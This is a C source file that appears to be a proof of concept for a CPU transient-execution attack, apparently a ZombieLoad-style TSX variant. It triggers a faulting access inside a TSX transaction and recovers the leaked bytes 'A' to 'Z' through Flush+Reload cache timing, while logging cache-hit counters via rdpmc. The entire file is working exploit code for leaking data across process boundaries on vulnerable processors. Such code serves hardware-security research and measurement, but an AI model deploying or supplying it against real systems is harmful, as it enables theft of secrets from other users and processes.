#define _GNU_SOURCE 1

#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <string.h>

#include "cacheutils.h"

#define FROM 'A'
#define TO 'Z'

char __attribute__((aligned(4096))) mem[256 * 4096];
char __attribute__((aligned(4096))) mapping[4096];
size_t hist[256];
u_int32_t pum_sum[] = {0x0, 0x0, 0x0, 0x0};
u_int32_t pmu_count[] = {0x0, 0x0, 0x0, 0x0};

void recover(void);

int main(int argc, char *argv[])
{
  if (!has_tsx())
  {
    printf("[!] Variant 2 requires a CPU with Intel TSX support!\n");
  }

  /* Initialize and flush LUT */
  memset(mem, 0, sizeof(mem));

  for (size_t i = 0; i < 256; i++)
  {
    flush(mem + i * 4096);
  }

  /* Initialize mapping */
  memset(mapping, 0, 4096);

  // Calculate Flush+Reload threshold
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Threshold: %u\n", (unsigned int)CACHE_MISS);
  while (true)
  {
    for (uint64_t i = 0; i < 4; i++)
    {
      asm volatile(
          "mfence\n\t"
          "rdpmc\n\t"
          "mfence\n\t"
          : "=a"(pmu_count[i])
          : "c"(i)
          :);
    }

    /* Flush mapping */
    flush(mapping);

    /* Begin transaction and recover value */
    if (xbegin() == (~0u))
    {
      maccess(mem + 4096 * mapping[0]);
      xend();
    }

    for (uint64_t i = 0; i < 4; i++)
    {
      asm volatile(
          "mfence\n\t"
          "rdpmc\n\t"
          "mfence\n\t"
          "sub %%ebx, %%eax\n\t"
          : "=a"(pmu_count[i])
          : "c"(i), "b"(pmu_count[i])
          :);
    }

    recover();
  }

  return 0;
}

void recover(void)
{

  /* Recover value from cache and update histogram */
  bool update = false;
  for (size_t i = FROM; i <= TO; i++)
  {
    if (flush_reload((char *)mem + 4096 * i))
    {
      hist[i]++;
      update = true;
    }
  }

  /* Redraw histogram on update */
  if (update == true)
  {
    printf("\x1b[2J");

    int max = 1;
    int sum = 0;

    for (int i = FROM; i <= TO; i++)
    {
      if (hist[i] > max)
      {
        max = hist[i];
      }
    }

    for (int i = FROM; i <= TO; i++)
    {
      printf("%c: (%4u) ", i, (unsigned int)hist[i]);
      sum += (unsigned int)hist[i];
      for (int j = 0; j < hist[i] * 60 / max; j++)
      {
        printf("#");
      }
      printf("\n");
    }
    printf("| leak D | l1 hit | l2 hit | l3 hit | lfb hit |\n");
    printf("| %6d ", sum);
    for (uint32_t i = 0; i < 4; i++)
    {
      pum_sum[i] += pmu_count[i];
      printf("| %6d ", pum_sum[i]);
    }
    printf("|\n");
    fflush(stdout);
  }
  // else
  // {
  //   printf("| leak D | l1 hit | l2 hit | l3 hit | lfb hit |\n");
  //   printf("| %6d ", 0);
  //   for (uint32_t i = 0; i < 4; i++)
  //   {
  //     pum_sum[i] += pmu_count[i];
  //     printf("| %6d ", pum_sum[i]);
  //   }
  //   printf("|\n");
  // }
}
